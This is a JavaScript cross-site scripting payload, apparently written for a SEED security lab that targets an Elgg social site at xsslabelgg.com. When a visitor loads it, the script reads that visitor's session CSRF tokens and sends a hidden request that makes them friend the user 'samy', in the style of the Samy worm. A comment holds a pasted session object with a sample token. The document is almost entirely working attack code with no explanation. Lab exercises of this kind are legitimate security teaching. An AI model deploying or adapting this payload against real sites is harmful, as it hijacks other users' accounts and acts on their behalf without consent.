<script type="text/javascript">
	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var thisprofilename=elgg.session.user.username;
	//Construct the HTTP request to add Samy as a friend.

	if(thisprofilename!="samy")
		{
		var sendurl="http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token; //FILL IN


	// http://www.xsslabelgg.com/action/friends/add?friend=47&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg&__elgg_ts=1624188449&__elgg_token=pjGWyXpTvM3N4OrLxPKcQg
	//Create and send Ajax request to add friend

	//var elgg = {"config":{"lastcache":1549469404,"viewtype":"default","simplecache_enabled":1},"security":{"token":{"__elgg_ts":1624188449,"__elgg_token":"pjGWyXpTvM3N4OrLxPKcQg"}},"session":{"user":{"guid":44,"type":"user","subtype":"","owner_guid":44,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:29:47+00:00","time_updated":"2017-07-26T20:29:48+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/alice","name":"Alice","username":"alice","language":"en","admin":false},"token":"ciCJlRtwRNz2GFwjM9VI3l"},"_data":{},"page_owner":{"guid":47,"type":"user","subtype":"","owner_guid":47,"container_guid":0,"site_guid":1,"time_created":"2017-07-26T20:30:59+00:00","time_updated":"2021-06-20T10:38:29+00:00","url":"http:\/\/www.xsslabelgg.com\/profile\/samy","name":"Samy","username":"samy","language":"en"}};
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

		}
	
	}
</script>